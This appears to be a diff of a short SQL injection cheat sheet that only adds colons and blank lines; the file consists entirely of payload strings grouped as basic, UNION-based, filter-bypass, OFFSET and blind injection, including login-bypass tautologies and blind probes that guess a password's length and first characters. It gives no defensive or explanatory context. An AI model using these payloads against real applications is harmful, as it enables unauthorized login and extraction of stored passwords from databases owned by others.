@@ -1,16 +1,20 @@
-SQL Injection Payload
+SQL Injection Payload:
+
 Basic Injection:
+
 ‘ OR 1=1; - - t
 UNION-based Injection:
 ' UNION SELECT database() -- t 
 %')) UNION SELECT 1,2,3,4,5,6,7; - - t 
 
 Filter Bypass:
+
 Username: \
 Password: OR 1=1 #
 OFFSET Injection:
 ' OR 1=1 LIMIT 1 OFFSET 1 -- t
 
 Blind SQL Injection: 
+
 ' AND LENGTH(password)=20 #
 ' AND password LIKE 'a%' #
